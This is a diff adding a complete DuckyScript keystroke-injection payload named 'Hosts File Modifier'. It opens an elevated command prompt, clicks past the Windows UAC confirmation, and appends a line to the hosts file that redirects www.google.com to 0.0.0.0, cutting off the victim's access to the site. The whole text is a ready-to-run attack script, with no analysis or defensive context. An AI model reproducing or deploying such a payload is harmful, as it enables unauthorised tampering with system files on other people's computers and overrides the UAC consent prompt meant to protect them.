@@ -1,0 +1,18 @@
+REM ##################### Hosts File Modifier #####################
+REM ######################## Author: Lewis ########################
+DELAY 2000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 400
+LEFT
+ENTER
+DELAY 500
+STRING cd C:\Windows\System32\drivers\etc
+ENTER
+DELAY 400
+STRING echo 0.0.0.0 www.google.com>>hosts & exit
+ENTER
